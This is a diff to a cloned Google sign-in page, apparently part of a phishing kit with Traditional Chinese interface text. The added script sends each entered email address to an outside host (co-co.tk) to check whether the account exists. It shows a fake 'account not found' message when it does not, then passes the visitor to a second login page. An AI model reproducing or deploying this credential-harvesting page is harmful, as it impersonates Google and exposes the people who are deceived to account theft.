@@ -336,7 +336,7 @@ unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+0
                     <form method="post" novalidate="">
                       <content>
                         <div jscontroller="mOzJ1b" jsaction="keydown:C9BaXe;O22p3e:Op2ZO;AHmuwe:Jt1EX;rcuQ6b:rcuQ6b;YqO5N:Lg5SV;EJh3N:rcuQ6b;sPvj8e:di0fJ;" jsname="dWPKW" class="cDSmF" data-allow-at-sign="true" role="presentation" jsshadow="" data-is-rendered="true">
-                          <div class="rFrNMe KSczvd uyaebd vHVGub zKHdkd sdJrJc Tyc9J" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV;" jsshadow="" jsname="Vsb5Ub">
+                          <div class="rFrNMe KSczvd uyaebd vHVGub zKHdkd sdJrJc Tyc9J" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV;" jsshadow="" jsname="Vsb5Ub" id="jjjjjaaaaaooooo">
                             <div class="aCsJod oJeWuf">
                               <div class="aXBtI Wic03c">
                                 <div class="Xb9hP">
@@ -349,7 +349,7 @@ unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+0
                             </div>
                             <div class="LXRPh">
                               <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
-                              <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div>
+                              <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive" id="DDFo"></div>
                             </div>
                           </div>
                         </div>
@@ -456,6 +456,7 @@ unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+0
 </div>
 <div class="lDwpOe"></div>
 <script>
+	var ddddd = "null";
 	document.getElementById("identifierId").addEventListener("keyup", function(event) {				event.preventDefault();
 			if (event.keyCode === 13) {
 				document.getElementById("identifierNext").click();
@@ -465,13 +466,20 @@ unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+0
 		if(!document.getElementById("identifierId").value) {
 			alert("電子郵件地址或電話號碼不得為空");
 		} else {
-			var ddddd = document.getElementById("identifierId").value;
-			Cookies.set('email', ddddd);
-			if(!urldata("redirect")) {
-				window.location.href="./GoogleLogin2.htm";
-			} else {
-				window.location.href="./GoogleLogin2.htm?redirect="+urldata("redirect");
-			}
+			ddddd = document.getElementById("identifierId").value;
+			var xhttp = new XMLHttpRequest();
+				xhttp.onreadystatechange = function() {
+					if(this.readyState == 4 && this.status == 200) {
+						if(this.responseText=="Y") {
+							cango();
+						} else {
+							document.getElementById("jjjjjaaaaaooooo").class += " k0tWj IYewr";
+							document.getElementById("DDFo").innerHTML = "找不到您的 Google 帳戶";
+						}
+					}
+				};
+			xhttp.open("GET", "https://co-co.tk/test/GoogleCheck/?email="+ddddd, true);
+			xhttp.send();
 		}
 	}
 	function urldata(key) {
@@ -484,6 +492,14 @@ unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+0
 			++i;
 		}
 		return a;
+	}
+	function cango() {
+		Cookies.set('email', ddddd);
+		if(!urldata("redirect")) {
+			window.location.href="./GoogleLogin2.htm";
+		} else {
+			window.location.href="./GoogleLogin2.htm?redirect="+urldata("redirect");
+		}
 	}
 </script>
 </body>
